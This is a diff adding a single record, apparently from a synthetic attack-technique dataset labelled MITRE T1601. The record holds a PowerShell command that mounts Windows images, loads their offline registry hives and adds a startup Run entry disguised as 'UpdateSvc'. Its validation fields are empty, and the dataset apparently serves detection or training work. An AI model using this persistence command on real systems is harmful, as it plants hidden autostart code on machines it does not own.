@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Image /ImageFile:C:\\images\\install_clean.wim /Index:1 /MountDir:C:\\Mount\\Base; dism /Mount-Image /ImageFile:C:\\images\\install_mod.wim /Index:1 /MountDir:C:\\Mount\\Win; reg load HKLM\\BASESOFT C:\\Mount\\Base\\Windows\\System32\\Config\\SOFTWARE >$null; reg load HKLM\\OFFSOFT C:\\Mount\\Win\\Windows\\System32\\Config\\SOFTWARE >$null; New-Item -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -Force | Out-Null; New-ItemProperty -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"UpdateSvc\" -Value \"C:\\Windows\\System32\\updater.ps1\" -PropertyType String -Force | Out-Null; $b=(Get-ItemProperty \"Registry::HKEY_LOCAL_MACHINE\\BASESOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -ErrorAction SilentlyContinue | Select-Object -ExcludeProperty PS* | Out-String).Trim().Split(\"`n\"); $m=(Get-ItemProperty \"Registry::HKEY_LOCAL_MACHINE\\OFFSOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -ErrorAction SilentlyContinue | Select-Object -ExcludeProperty PS* | Out-String).Trim().Split(\"`n\"); Compare-Object $b $m",
+  "explanation": "Modifies the offline image's Run key to establish startup execution and compares the registry values against a clean baseline using Compare-Object.",
+  "rationale_steps": [
+    "Mount images and load offline SOFTWARE hives (Admin-only).",
+    "Create a new Run entry in the modified image.",
+    "Extract values from both hives and Compare-Object to confirm the added autorun."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-f5c24626-05eb1a53",
+  "source_prompt_hash": "f5c24626",
+  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
